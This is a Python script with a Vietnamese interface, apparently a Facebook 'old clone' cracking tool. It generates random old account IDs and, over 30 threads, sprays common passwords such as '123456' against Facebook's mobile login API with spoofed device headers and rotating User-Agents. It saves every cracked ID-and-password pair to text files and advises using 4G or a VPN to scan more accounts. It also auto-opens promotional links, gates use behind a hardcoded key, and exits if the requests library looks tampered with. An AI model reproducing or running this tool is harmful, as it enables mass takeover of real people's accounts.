import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
from pystyle import Colors, Colorate, Write, Center, Anime, System

import os, sys

os.system('xdg-open https://www.youtube.com/@plahuydz')
os.system('xdg-open https://t.me/@hqhteam')
os.system('xdg-open https://zalo.me/g/jtkizz091')


#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import shutil
import time

# Link kenh WhatsApp cua ban
channel_link = "https://t.me/0329187930"

# Khoa hop le
approved_keys = [
    "Hoangloc@113"
]

# Cau hinh so lan thu va thoi gian cho
MAX_ATTEMPTS = 3
COOLDOWN_SECONDS = 8

def clear_screen():
    os.system("clear" if os.name != 'nt' else "cls")

def open_link(url):
    """Mo link tren may tinh"""
    try:
        import webbrowser
        webbrowser.open(url)
    except:
        if shutil.which("xdg-open"):
            subprocess.run(["xdg-open", url], check=False)
        elif os.name == 'nt':
            os.system(f'start {url}')

def normalize(s):
    """
    Chuan hoa chuoi de so sanh:
    - Xoa khoang trang dau/cuoi
    - Thu gon nhieu khoang trang thanh mot
    - Chuyen thanh chu thuong
    """
    if s is None:
        return ""
    return " ".join(s.split()).lower()

# Chuan bi tap khoa da chuan hoa
approved_normalized = { normalize(k) for k in approved_keys }

def first_step():
    clear_screen()
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║            SCAN FACEBOOK WAS LOCKED                      ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(banner)))
    print(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter("Quét acc cổ facebook\n")))
    print(Colorate.Horizontal(Colors.cyan_to_blue, "Kênh admin\n"))
    print(Colorate.Horizontal(Colors.purple_to_blue, f"Link kenh: {channel_link}\n"))

    if not (channel_link.startswith("http://") or channel_link.startswith("https://")):
        print(Colorate.Horizontal(Colors.red_to_yellow, "Dinh dang link khong hop le - URL phai bat dau bang http/https."))
    else:
        try:
            open_link(channel_link)
            print(Colorate.Horizontal(Colors.green_to_cyan, "Cần hỗ trợ gì ibe kênh>:)"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_yellow, f"Loi khi mo link: {e}"))

    input(Colorate.Horizontal(Colors.blue_to_purple, "\nNhấn <ENTER> để bắt đầu: "))
def check_key():
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        user_key = input(Colorate.Horizontal(Colors.cyan_to_blue, "\nNhập mã khoá của bạn: "))
        user_norm = normalize(user_key)
        if user_norm in approved_normalized:
            print(Colorate.Horizontal(Colors.green_to_cyan, "\nĐúng rồi chạy...\n"))
            return True
        else:
            attempts += 1
            remaining = MAX_ATTEMPTS - attempts
            print(Colorate.Horizontal(Colors.red_to_yellow, f"\nKhoa khong hop le! So lan thu con lai: {remaining}"))
    
    print(Colorate.Horizontal(Colors.red_to_purple, f"\nQua nhieu lan thu sai. Vui long doi {COOLDOWN_SECONDS} giay."))
    time.sleep(COOLDOWN_SECONDS)
    sys.exit(1)

if __name__ == "__main__":
    first_step()
    check_key()
    print(Colorate.Horizontal(Colors.green_to_cyan, ">>> Cong Cu Da Duoc Mo Khoa Thanh Cong <<<"))

# Dam bao cac module can thiet da duoc cai dat
modules = ['requests', 'urllib3', 'mechanize', 'rich', 'pystyle']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Tat canh bao InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Thiet lap ban dau
clear_screen()
print(Colorate.Horizontal(Colors.cyan_to_blue, '\nDang tai cac module...\n'))
time.sleep(1)
clear_screen()

# --- Kiem tra chong can thiep va bao mat ---
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass

# Bien toan cuc
method = []
oks = []
cps = []
loop = 0
user = []

# Duong dan file - Luu trong thu muc hien tai
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
FILE_M1 = os.path.join(CURRENT_DIR, 'AHB-OLD-M1-OK.txt')  # 2011 tro len
FILE_M2 = os.path.join(CURRENT_DIR, 'AHB-OLD-M2-OK.txt')  # 2009-2010
FILE_ALL = os.path.join(CURRENT_DIR, 'AHB-ALL-ACCOUNTS.txt')

def windows():
    """Tao User-Agent Windows ngau nhien"""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    """Tao User-Agent Windows ngau nhien bien the khac"""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

# Dat tieu de cua so
sys.stdout.write('\x1b]2; ANH HUNG OLD CLONE \x07')

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    banner_text = """
    
░━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━       
░╔═╗╔═╗╔═╗╔╗╔  ╔═╗╦  ╔╦╗  ╔═╗╦  ╔═╗╔╗╔╔═╗  ╔═╗╔╗                   
░╚═╗║  ╠═╣║║║  ║ ║║   ║║  ║  ║  ║ ║║║║║╣   ╠╣ ╠╩╗                  
░╚═╝╚═╝╩ ╩╝╚╝  ╚═╝╩═╝═╩╝  ╚═╝╩═╝╚═╝╝╚╝╚═╝  ╚  ╚═╝                  
░                                                                   
░                                                                  
░|_|     _    |   _   |_   |  __ |   _        ,_                   
░| |()(|||(|  |()(_  (|_\\/|     |()(_  |)()|`||                   
░        _|                            |                                 
░━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    print(Colorate.Horizontal(Colors.green_to_cyan, banner_text))
    print(Colorate.Horizontal(Colors.cyan_to_blue, f"Thu muc luu ket qua: {CURRENT_DIR}"))
    print(Colorate.Horizontal(Colors.yellow_to_green, f"├── AHB-OLD-M1-OK.txt (Tai khoan 2011+)"))
    print(Colorate.Horizontal(Colors.yellow_to_green, f"└── AHB-OLD-M2-OK.txt (Tai khoan 2009-2010)\n"))

def creationyear(uid):
    """Uoc tinh nam tao tai khoan Facebook dua tren UID"""
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return 2009
        if uid.startswith('100000000'):
            return 2009
        if uid.startswith('10000000'):
            return 2009
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return 2009
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return 2010
        if uid.startswith('100001'):
            return 2010
        if uid.startswith(('100002', '100003')):
            return 2011
        if uid.startswith('100004'):
            return 2012
        if uid.startswith(('100005', '100006')):
            return 2013
        if uid.startswith(('100007', '100008')):
            return 2014
        if uid.startswith('100009'):
            return 2015
        if uid.startswith('10001'):
            return 2016
        if uid.startswith('10002'):
            return 2017
        if uid.startswith('10003'):
            return 2018
        if uid.startswith('10004'):
            return 2019
        if uid.startswith('10005'):
            return 2020
        if uid.startswith('10006'):
            return 2021
        if uid.startswith('10009'):
            return 2023
        if uid.startswith(('10007', '10008')):
            return 2022
        return 0
    elif len(uid) in (9, 10):
        return 2008
    elif len(uid) == 8:
        return 2007
    elif len(uid) == 7:
        return 2006
    elif len(uid) == 14 and uid.startswith('61'):
        return 2024
    else:
        return 0

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def linex():
    print(Colorate.Horizontal(Colors.cyan_to_blue, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))

def save_result(filepath, content):
    """Luu ket qua vao file"""
    try:
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
        
        with open(FILE_ALL, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
        
        return True
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\nLoi khi luu file: {e}"))
        return False

def get_target_file(year):
    """Xac dinh file dua theo nam"""
    if year <= 2010:
        return FILE_M2, "AHB-M2"
    else:
        return FILE_M1, "AHB-M1"

def print_success(uid, pw, year, method_name, target_file):
    """In thong bao thanh cong voi dinh dang dep"""
    success_msg = f"THANH CONG | UID: {uid} | MK: {pw} | NAM: {year} | PP: {method_name}"
    print(Colorate.Horizontal(Colors.green_to_yellow, success_msg))

def BNG_71_():
    """Menu chinh"""
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      A OLD CLONE"))
    print()
    linex()
    choice = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      LUA CHON CUA BAN : "))
    if choice in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\nVui long chon tuy chon hop le... "))
        time.sleep(2)
        BNG_71_()

def old_clone():
    """Menu chon loai clone tai khoan cu"""
    ____banner____()
    print(Colorate.Horizontal(Colors.blue_to_cyan, "      A TAT CA CAC DONG"))
    print()
    linex()
    print(Colorate.Horizontal(Colors.green_to_yellow, "      B DONG 100003/4"))
    print()
    linex()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      C DONG 2009"))
    print()
    linex()
    choice = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      LUA CHON CUA BAN : "))
    if choice in ('A', 'a', '01', '1'):
        old_One()
    elif choice in ('B', 'b', '02', '2'):
        old_Tow()
    elif choice in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\nVui long chon tuy chon hop le... "))
        BNG_71_()

def old_One():
    """Phuong thuc clone cho tai khoan 2010-2014"""
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      NĂM : 2010-2014 ( ENTER ĐỂ CHỌN TẤT CẢ )"))
    print()
    ask = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      VI DU : 20000 / 30000 / 99999"))
    print()
    limit = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      SO LUONG ID : "))
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(Colorate.Horizontal(Colors.blue_to_purple, "      A PHUONG PHAP 1"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_blue, "      B PHUONG PHAP 2"))
    print()
    linex()
    meth = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON PHUONG PHAP (A/B): ")).strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"      Tổng số id cần crack : {limit}"))
        print()
        print(Colorate.Horizontal(Colors.cyan_to_blue, "      Bật 4g hoặc vpn để scan được nhiều acc nhất có thể"))
        print()
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"PHUONG PHAP KHONG HOP LE"))
                break

def old_Tow():
    """Phuong thuc clone cho tai khoan voi tien to cu the"""
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      NĂM : 2010-2014 ( ENTER ĐỂ CHỌN TẤT CẢ )"))
    print()
    ask = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      VI DU : 20000 / 30000 / 99999"))
    print()
    limit = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      SO LUONG ID : "))
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    print(Colorate.Horizontal(Colors.blue_to_purple, "      A PHUONG PHAP 1"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_blue, "      B PHUONG PHAP 2"))
    print()
    linex()
    meth = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON PHUONG PHAP (A/B): ")).strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"      Tổng số id cần crack : {limit}"))
        print()
        print(Colorate.Horizontal(Colors.cyan_to_blue, "      Sử dụng 4g hoặc vpn để scan nhiều acc nhất có thể"))
        print()
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"PHUONG PHAP KHONG HOP LE"))
                break

def old_Tree():
    """Phuong thuc clone cho tai khoan 2009-2010"""
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      MA CU : 2009-2010"))
    print()
    ask = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      VI DU : 20000 / 30000 / 99999"))
    print()
    limit = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      SO LUONG ID : "))
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    print(Colorate.Horizontal(Colors.blue_to_purple, "      A PHUONG PHAP 1"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_blue, "      B PHUONG PHAP 2"))
    print()
    linex()
    meth = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON PHUONG PHAP (A/B): ")).strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"      TONG ID CAN CRACK : {limit}"))
        print()
        print(Colorate.Horizontal(Colors.cyan_to_blue, "      Sử dụng 4g hoặc vpn để scan nhiều acc nhất có thể"))
        print()
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"PHUONG PHAP KHONG HOP LE"))
                break

def login_1(uid):
    """Phuong thuc dang nhap 1"""
    global loop
    session = requests.session()
    try:
        progress_text = f"DANG XU LY [{loop}] | THANH CONG [{len(oks)}]"
        sys.stdout.write(f"\r{Colorate.Horizontal(Colors.cyan_to_blue, progress_text)}")
        sys.stdout.flush()
        
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False)
            
            try:
                json_res = res.json()
            except:
                json_res = {}
            
            if 'session_key' in json_res:
                year = creationyear(uid)
                target_file, method_name = get_target_file(year)
                content = f"{uid}|{pw}|{year}"
                save_result(target_file, content)
                print_success(uid, pw, year, method_name, target_file)
                oks.append(uid)
                break
            elif 'www.facebook.com' in json_res.get('error', {}).get('message', ''):
                year = creationyear(uid)
                target_file, method_name = get_target_file(year)
                content = f"{uid}|{pw}|{year}"
                save_result(target_file, content)
                print_success(uid, pw, year, method_name, target_file)
                oks.append(uid)
                break
        loop += 1
    except Exception as e:
        pass

def login_2(uid):
    """Phuong thuc dang nhap 2"""
    global loop
    progress_text = f"DANG XU LY [{loop}] | THANH CONG [{len(oks)}]"
    sys.stdout.write(f"\r{Colorate.Horizontal(Colors.cyan_to_blue, progress_text)}")
    sys.stdout.flush()
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers)
                
                try:
                    json_po = po.json()
                except:
                    json_po = {}
                
                if 'session_key' in str(json_po):
                    year = creationyear(uid)
                    target_file, method_name = get_target_file(year)
                    content = f"{uid}|{pw}|{year}"
                    save_result(target_file, content)
                    print_success(uid, pw, year, method_name, target_file)
                    oks.append(uid)
                    break
                elif 'session_key' in json_po:
                    year = creationyear(uid)
                    target_file, method_name = get_target_file(year)
                    content = f"{uid}|{pw}|{year}"
                    save_result(target_file, content)
                    print_success(uid, pw, year, method_name, target_file)
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()